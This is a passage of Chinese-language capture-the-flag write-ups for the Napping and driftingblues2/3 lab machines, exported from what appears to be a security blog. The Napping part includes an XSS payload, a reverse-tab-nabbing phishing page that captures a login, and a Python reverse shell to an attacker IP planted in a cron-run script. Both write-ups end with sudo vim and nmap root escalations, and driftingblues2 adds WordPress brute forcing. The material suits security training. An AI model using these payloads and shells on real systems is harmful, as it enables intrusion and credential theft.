<p><img data-src="./Napping/3.png" alt></p>
<ul>
<li>全局<code>csrf</code>问题</li>
<li>此处一个<code>self-xss</code>,没啥用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\123'''&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./Napping/4.png" alt></p>
<h3 id="reverse-tab-nabbing"><a href="#reverse-tab-nabbing" class="headerlink" title="reverse-tab-nabbing"></a>reverse-tab-nabbing</h3><p><a href="https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing" target="_blank" rel="noopener">Reverse Tab Nabbing - HackTricks</a></p>
<ul>
<li>构造恶意钓鱼页面</li>
<li>nabbing_blog.html</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (<span class="built_in">window</span>.opener) <span class="built_in">window</span>.opener.parent.location.replace(<span class="string">'http://192.168.1.82:8000/index.html'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (<span class="built_in">window</span>.parent != <span class="built_in">window</span>) <span class="built_in">window</span>.parent.location.replace(<span class="string">'http://192.168.1.82:8000/index.html'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">blah</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.opener.location = <span class="string">"http://192.168.1.82:8000/index.html"</span>;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>index.html</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span>&#123; <span class="attribute">font</span>: <span class="number">14px</span> sans-serif; &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.wrapper</span>&#123; <span class="attribute">width</span>: <span class="number">360px</span>; <span class="attribute">padding</span>: <span class="number">20px</span>; &#125;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please fill in your credentials to login.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"form-control "</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"invalid-feedback"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control "</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"invalid-feedback"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">value</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Don't have an account? <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"register.php"</span>&gt;</span>Sign up now<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>输入恶意博客地址</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.82/nabbing_blog.html</span><br></pre></td></tr></table></figure>

<p><img data-src="./Napping/5.png" alt></p>
<ul>
<li>成功钓鱼获取账号密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">daniel / C@ughtm3napping123</span><br></pre></td></tr></table></figure>

<ul>
<li>备注：真实实验新版本<code>firefox</code>, <code>chrome</code>已经失效，<code>kali</code>自带<code>firefox ESR</code>可以</li>
</ul>
<h3 id="ssh-shell"><a href="#ssh-shell" class="headerlink" title="ssh-shell"></a>ssh-shell</h3><ul>
<li>登录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh daniel@192.168.1.192 </span><br><span class="line">C@ughtm3napping123</span><br></pre></td></tr></table></figure>

<p><img data-src="./Napping/6.png" alt></p>
<p><img data-src="./Napping/7.png" alt></p>
<p><img data-src="./Napping/8.png" alt></p>
<p>可以看出，<code>query.py</code>脚本每2min执行一次</p>
<ul>
<li>修改``query.py`</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.1.82"</span>,<span class="number">7776</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">"sh"</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="./Napping/9.png" alt></p>
<ul>
<li>成功拿到另一个账户</li>
</ul>
<p><img data-src="./Napping/10.png" alt></p>
<ul>
<li><code>vim</code>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim -c ':!/bin/sh'</span><br></pre></td></tr></table></figure>

<p><img data-src="./Napping/11.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Napping</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Napping</tag>
      </tags>
  </entry>
  <entry>
    <title>driftingblues2</title>
    <url>/2021/05/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/driftingblues2/</url>
    <content><![CDATA[<h1 id="driftingblues2"><a href="#driftingblues2" class="headerlink" title="driftingblues2"></a>driftingblues2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>driftingblues2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues2]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:51, IPv4: 192.168.43.189</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	26:ca:cd:37:40:d8	(Unknown: locally administered)</span><br><span class="line">192.168.43.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.43.239	08:00:27:91:94:9b	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.958 seconds (130.75 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.239</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.239</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues2]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.239</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 03:39 EDT</span><br><span class="line">Nmap scan report for wordpress.aragog.hogwarts (192.168.43.239)</span><br><span class="line">Host is up (0.00086s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     ProFTPD</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rwxr-xr-x   1 ftp      ftp       1403770 Dec 17 13:20 secret.jpg</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)</span><br><span class="line">|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)</span><br><span class="line">|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:91:94:9B (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.11 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./driftingblues2/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.239/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.239/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.239/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/22 03:39:43 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 128]</span><br><span class="line">/blog                 (Status: 301) [Size: 315] [--&gt; http://192.168.43.239/blog/]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]                                  </span><br><span class="line">                                                                                 </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/22 03:42:36 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.43.239/blog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.239/blog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.239/blog/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/22 03:48:01 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/wp-content           (Status: 301) [Size: 326] [--&gt; http://192.168.43.239/blog/wp-content/]</span><br><span class="line">/index.php            (Status: 301) [Size: 0] [--&gt; http://192.168.43.239/blog/]             </span><br><span class="line">/license.txt          (Status: 200) [Size: 19915]                                           </span><br><span class="line">/wp-login.php         (Status: 200) [Size: 7485]                                            </span><br><span class="line">/wp-includes          (Status: 301) [Size: 327] [--&gt; http://192.168.43.239/blog/wp-includes/]</span><br><span class="line">/readme.html          (Status: 200) [Size: 7345]                                             </span><br><span class="line">/wp-trackback.php     (Status: 200) [Size: 135]                                              </span><br><span class="line">/wp-admin             (Status: 301) [Size: 324] [--&gt; http://192.168.43.239/blog/wp-admin/]   </span><br><span class="line">/xmlrpc.php           (Status: 405) [Size: 42]                                               </span><br><span class="line">/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://driftingblues.box/blog/wp-login.php?action=register]</span><br><span class="line">                                                                                                              </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/22 03:50:32 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./driftingblues2/2.png" alt></p>
<ul>
<li>访问<a href="http://192.168.43.239/blog/" target="_blank" rel="noopener">http://192.168.43.239/blog/</a></li>
</ul>
<p>需要配置<code>hosts</code></p>
<p><img data-src="./driftingblues2/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.43.239 driftingblues.box</span><br></pre></td></tr></table></figure>

<h3 id="登录Ftp服务器"><a href="#登录Ftp服务器" class="headerlink" title="登录Ftp服务器"></a>登录Ftp服务器</h3><ul>
<li>发现照片</li>
</ul>
<p><img data-src="./driftingblues2/4.png" alt></p>
<h3 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h3><p><img data-src="./driftingblues2/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://driftingblues.box/blog/ --enumerate u</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues2]</span><br><span class="line">└─# wpscan --url http://driftingblues.box/blog/ --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.17</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://driftingblues.box/blog/ [192.168.43.239]</span><br><span class="line">[+] Started: Sat May 22 04:06:53 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.38 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://driftingblues.box/blog/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://driftingblues.box/blog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://driftingblues.box/blog/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://driftingblues.box/blog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.7.2 identified (Latest, released on 2021-05-12).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://driftingblues.box/blog/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.7.2&lt;/generator&gt;</span><br><span class="line"> |  - http://driftingblues.box/blog/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.7.2&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwentyone</span><br><span class="line"> | Location: http://driftingblues.box/blog/wp-content/themes/twentytwentyone/</span><br><span class="line"> | Last Updated: 2021-04-27T00:00:00.000Z</span><br><span class="line"> | Readme: http://driftingblues.box/blog/wp-content/themes/twentytwentyone/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.3</span><br><span class="line"> | Style URL: http://driftingblues.box/blog/wp-content/themes/twentytwentyone/style.css?ver=1.0</span><br><span class="line"> | Style Name: Twenty Twenty-One</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwentyone/</span><br><span class="line"> | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://driftingblues.box/blog/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=======================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] albert</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://driftingblues.box/blog/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Sat May 22 04:06:55 2021</span><br><span class="line">[+] Requests Done: 26</span><br><span class="line">[+] Cached Requests: 36</span><br><span class="line">[+] Data Sent: 7.467 KB</span><br><span class="line">[+] Data Received: 91.525 KB</span><br><span class="line">[+] Memory used: 158.195 MB</span><br><span class="line">[+] Elapsed time: 00:00:01</span><br></pre></td></tr></table></figure>

<ul>
<li>暴力破解<code>albert</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: albert, Password: scotland1</span><br></pre></td></tr></table></figure>

<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><img data-src="./driftingblues2/6.png" alt></p>
<p><img data-src="./driftingblues2/7.png" alt></p>
<p><img data-src="./driftingblues2/8.png" alt></p>
<p><img data-src="./driftingblues2/9.png" alt></p>
<ul>
<li>可查看<code>freddie ssh</code> 信息</li>
</ul>
<p><img data-src="./driftingblues2/10.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 登录 freddie</span><br><span class="line">ssh -i id_rsa freddie@192.168.43.239</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues2/11.png" alt></p>
<ul>
<li>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">freddie@driftingblues:~$ sudo -l</span><br><span class="line">Matching Defaults entries for freddie on driftingblues:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User freddie may run the following commands on driftingblues:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap --interactive</span><br><span class="line"><span class="meta">nmap&gt;</span><span class="bash"> !sh</span></span><br><span class="line"></span><br><span class="line">TF=$(mktemp)</span><br><span class="line">echo 'os.execute("/bin/sh")' &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues2/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>driftingblues</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>driftingblues3</title>
    <url>/2021/05/23/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/driftingblues3/</url>
    <content><![CDATA[<h1 id="driftingblues3"><a href="#driftingblues3" class="headerlink" title="driftingblues3"></a>driftingblues3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>driftingblues3</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:51, IPv4: 192.168.43.189</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	26:ca:cd:37:40:d8	(Unknown: locally administered)</span><br><span class="line">192.168.43.149	08:00:27:e3:42:41	PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.967 seconds (130.15 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.149</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.149</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.149</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 12:22 EDT</span><br><span class="line">Nmap scan report for 192.168.43.149</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)</span><br><span class="line">|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)</span><br><span class="line">|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)</span><br><span 